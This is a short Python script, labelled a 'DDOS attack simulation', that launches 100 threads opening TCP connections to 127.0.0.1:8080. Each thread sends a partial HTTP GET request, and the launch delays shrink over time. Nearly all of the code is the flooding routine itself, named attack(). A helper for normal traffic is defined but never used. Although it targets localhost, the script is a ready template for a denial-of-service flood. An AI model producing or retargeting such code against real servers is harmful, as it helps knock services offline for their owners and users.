import socket
import threading
import time

target_host = "127.0.0.1"
target_port = 8080
num_connections = 100

def send_normal_traffic():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))
    packet = b"GET / HTTP/1.1\r\n"
    client.sendto(packet, (target_host, target_port))
    
    response = client.recv(4096)
    print(response)
    
    client.close()

def attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))
    packet = b"GET / HTTP/1.1\r\n"
    client.sendto(packet, (target_host, target_port))
    
    client.close()

initial_delay = 1.0
decay_factor = 0.9

threads = []
for i in range(num_connections):
    thread = threading.Thread(target=attack)
    threads.append(thread)
    thread.start()

    current_delay = initial_delay * (decay_factor ** i)
    time.sleep(current_delay)

for thread in threads:
    thread.join()

print("DDOS attack simulation completed.")
